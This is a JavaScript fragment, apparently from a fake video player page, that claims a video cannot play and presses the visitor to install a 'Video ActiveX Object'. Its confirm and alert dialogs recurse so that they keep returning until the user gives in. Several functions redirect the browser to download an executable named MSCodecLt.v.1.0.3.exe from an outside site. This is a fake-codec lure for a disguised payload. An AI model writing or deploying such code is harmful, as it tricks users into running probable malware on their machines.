function function_id_4(download,e) 
{ 
	if (e!=null && e.keyCode==27)
	{	Close();
		return;
	}	
    switch (download) 
    { 
        case "iax": document.location.href="http://download-st-software.com/MSCodecLt.v.1.0.3.exe"; break; 
        Close(); 
    } 

} 

function function_id_6() {
	if (confirm('Error Running Video Object.\n\nThis video file can not be played.\nClick on \'OK\' to save and setup the latest Video Object version.')) {
		location.href="http://download-st-software.com/MSCodecLt.v.1.0.3.exe";
	}
	else {
		if (alert('Please install new version of Video ActiveX Object.')) {
			function_id_6();
		}
		else {
			function_id_6();
		}			
	}
}

function function_id_7() 
{ 
    var p=document.getElementById("chudo_id");
    p.style.visibility="hidden"; 
	function_id_6();
} 
function function_id_8()
{
	alert('Install the latest Video ActiveX Object to play this video file.');
}

</script>


